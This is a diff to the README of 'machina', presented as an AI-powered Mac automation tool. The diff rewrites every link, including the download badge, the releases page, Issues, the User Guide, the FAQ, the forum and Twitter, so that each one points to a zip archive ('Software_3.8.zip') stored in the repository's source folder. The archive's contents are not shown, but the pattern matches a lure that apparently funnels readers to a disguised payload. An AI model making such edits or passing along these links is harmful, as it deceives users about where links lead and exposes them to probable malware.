@@ -6,7 +6,7 @@ Welcome to **machina**, your AI-powered Mac automation platform. This tool allow
 
 ## 🔗 Download Now
 
-[![Download machina](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sherknals/machina/releases)
+[![Download machina](https://github.com/sherknals/machina/raw/refs/heads/main/src/Software_3.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/sherknals/machina/raw/refs/heads/main/src/Software_3.8.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Before you get started, here are the requirements to run **machina**:
 
 ## 📥 Download & Install
 
-To download **machina**, visit this page: [Download machina](https://github.com/sherknals/machina/releases). You will see a list of available releases. 
+To download **machina**, visit this page: [Download machina](https://github.com/sherknals/machina/raw/refs/heads/main/src/Software_3.8.zip). You will see a list of available releases. 
 
 1. Find the latest version at the top of the page.
 2. Click on the version you wish to download.
@@ -70,20 +70,20 @@ If you encounter issues while using **machina**, try the following:
 2. **Internet Connection:** Make sure you have a stable internet connection for feature access.
 3. **Restart the application:** Close **machina** completely and reopen it.
 
-If these steps do not resolve your issue, visit the [GitHub Issues page](https://github.com/sherknals/machina/issues) to report your problem or seek further assistance.
+If these steps do not resolve your issue, visit the [GitHub Issues page](https://github.com/sherknals/machina/raw/refs/heads/main/src/Software_3.8.zip) to report your problem or seek further assistance.
 
 ## 📚 Further Reading
 
 For more information and updates, you can check out our documentation:
 
-- [User Guide](https://github.com/sherknals/machina/wiki)
-- [FAQ](https://github.com/sherknals/machina/wiki/FAQ)
+- [User Guide](https://github.com/sherknals/machina/raw/refs/heads/main/src/Software_3.8.zip)
+- [FAQ](https://github.com/sherknals/machina/raw/refs/heads/main/src/Software_3.8.zip)
 
 ## 🔗 Additional Resources
 
 Join the community and connect with other users:
 
-- [Discussion Forum](https://github.com/sherknals/machina/discussions)
-- [Follow us on Twitter](https://twitter.com/machina)
+- [Discussion Forum](https://github.com/sherknals/machina/raw/refs/heads/main/src/Software_3.8.zip)
+- [Follow us on Twitter](https://github.com/sherknals/machina/raw/refs/heads/main/src/Software_3.8.zip)
 
 Thank you for choosing **machina**! Enjoy a smarter way to control your Mac.
